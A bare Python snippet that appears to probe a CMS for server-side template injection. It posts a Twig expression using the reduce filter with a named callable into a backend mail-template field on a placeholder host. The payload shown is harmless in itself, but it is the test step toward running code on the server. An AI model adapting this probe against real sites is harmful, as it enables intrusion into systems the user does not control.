import requests
payload = "{{ ['x']|reduce('sum', 0) }}"
requests.post('https://council.example/backend/system/mailtemplates/update/9',
              data={'MailTemplate[content_html]': payload})
